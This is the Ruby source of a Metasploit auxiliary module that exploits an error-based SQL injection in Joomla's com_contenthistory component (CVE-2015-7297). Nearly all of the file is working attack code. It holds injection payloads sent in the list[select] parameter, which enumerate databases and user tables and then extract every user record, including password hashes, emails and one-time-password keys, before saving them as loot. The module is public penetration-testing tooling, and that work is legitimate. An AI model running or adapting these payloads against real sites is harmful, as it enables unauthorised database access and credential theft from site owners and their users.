##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
      'Description'    => %q{
      This module exploits a SQL injection vulnerability in Joomla versions 3.2 through 3.4.4
      in order to either enumerate usernames and password hashes or session IDs.
      },
      'References'     =>
        [
          ['CVE', '2015-7297'],
          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/']
        ],
      'Author'         =>
        [
          'Asaf Orpani', #discovery
          'bperry' #metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Oct 22 2015"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI of the Joomla instance', '/'])
      ], self.class)
  end

  def check
    flag = Rex::Text.rand_text_alpha(8)
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    payload = "AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT 0x#{flag.unpack("H*")[0]}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = sqli(payload)

    if res and res.body =~ /#{left_marker}#{flag}#{right_marker}/
      return Msf::Exploit::CheckCode::Vulnerable
    end

    return Msf::Exploit::CheckCode::Safe
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    db_count = "AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
    res = sqli(db_count)
    db_count = $1.to_i || 0 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/

    dbs = []
    0.upto(db_count-1) do |i|
      db = "AND (SELECT 2255 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      res = sqli(db)
      dbs << $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    dbs.delete('performance_schema')
    dbs.delete('information_schema')
    dbs.delete('mysql')

    users = []
    dbs.each do |db|
      vprint_status("Found database: " + db)
      tables = []
      table_count = "AND (SELECT 8640 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      res = sqli(table_count)
      table_count = $1.to_i || 0 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/

      0.upto(table_count-1) do |i|
        table = "AND (SELECT 2474 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        res = sqli(table)
        table = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
        tables << table if table =~ /_users$/
      end

      tables.each do |table|
        vprint_status("Found table: " + table)
        user_count = "AND (SELECT 3737 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        res = sqli(user_count)
        user_count = $1.to_i if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
        cols = ["activation","block","email","id","lastResetTime","lastvisitDate","name","otep","otpKey","params","password","registerDate","requireReset","resetCount","sendEmail","username"]

        0.upto(user_count-1) do |i|
          user = {}
          cols.each do |col|
            k = 1
            val = nil
            user[col] = ''
            while val != ''
              get_col = "AND (SELECT 7072 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),#{k},54) FROM #{db}.#{table} ORDER BY id LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
              res = sqli(get_col)
              val = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
              user[col] << val
              k = k + 54
            end
          end
          users << user
        end
      end
    end

    path = store_loot('joomla.file', 'text/plain', datastore['RHOST'], users.to_json, 'joomla.users')
    print_good("Users saved to file: " + path)
  end

  def sqli(payload)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_contenthistory',
        'view' => 'history',
        'list[ordering]' => '',
        'item_id' => 1,
        'type_id' => 1,
        'list[select]' => "1 " + payload
      }
    })
  end
end
